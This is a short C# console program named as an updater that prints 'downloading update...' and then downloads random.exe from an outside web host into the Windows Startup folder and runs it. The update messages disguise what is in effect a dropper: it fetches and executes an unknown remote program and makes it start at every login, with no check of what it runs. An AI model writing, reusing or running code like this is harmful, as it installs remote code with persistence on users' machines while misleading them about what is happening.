using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net;
using System.Diagnostics;

namespace updater
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient net = new WebClient();
            var cesta = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            Console.WriteLine("downloading update...");
            net.DownloadFile("http://randomimg.azurewebsites.net/random.exe", cesta + @"\Microsoft\Windows\Start Menu\Programs\Startup\random.exe");
            Console.WriteLine("update successfully downloaded");
            Process.Start(cesta + @"\Microsoft\Windows\Start Menu\Programs\Startup\random.exe");
            System.Environment.Exit(1);
        }
    }
}
